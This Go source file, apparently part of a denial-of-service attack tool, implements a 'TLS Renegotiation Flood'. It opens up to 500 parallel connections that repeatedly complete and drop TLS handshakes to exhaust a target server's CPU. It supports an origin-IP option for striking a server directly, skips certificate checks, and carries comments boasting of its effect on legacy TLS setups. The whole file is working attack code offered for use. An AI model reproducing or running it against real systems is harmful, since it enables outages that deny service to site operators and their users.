package attack

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// TLS Renegotiation Flood
// Force TLS handshake repeatedly on a single connection
// Each handshake = ~5x more CPU on server than client
// Devastating against legacy TLS configs

func runTLSRenegFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host, port, _, errParse := parseTargetForH2(cfg.Target)
	if errParse != nil {
		log.Printf("Invalid target: %v", errParse)
		return
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 100
	}
	if connCount > 500 {
		connCount = 500
	}

	log.Printf("TLS Renegotiation Flood: %d parallel connections to %s:%s", connCount, host, port)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("TLSReneg worker %d recovered: %v", id, r)
				}
			}()

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				err := tlsRenegConnection(host, port, deadline)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					time.Sleep(50 * time.Millisecond)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func tlsRenegConnection(host, port string, deadline time.Time) error {
	dialer := &net.Dialer{Timeout: 10 * time.Second}

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// Each iteration = full TLS handshake (CPU expensive on server)
		rawConn, err := dialer.Dial("tcp", host+":"+port)
		if err != nil {
			return err
		}

		if tcpConn, ok := rawConn.(*net.TCPConn); ok {
			tcpConn.SetNoDelay(true)
		}

		tlsConn := tls.Client(rawConn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
			// Force expensive cipher suites that require more server CPU
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			},
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS13,
		})
		tlsConn.SetDeadline(time.Now().Add(5 * time.Second))

		err = tlsConn.Handshake()
		if err != nil {
			rawConn.Close()
			atomic.AddInt64(&metrics.Failed, 1)
			continue
		}

		atomic.AddInt64(&metrics.TotalRequests, 1)
		atomic.AddInt64(&metrics.Completed, 1)

		// Immediately close - we just want handshake CPU cost
		tlsConn.Close()
	}

	return nil
}

func init() {
	// Sanity check
	_ = fmt.Sprintf
}

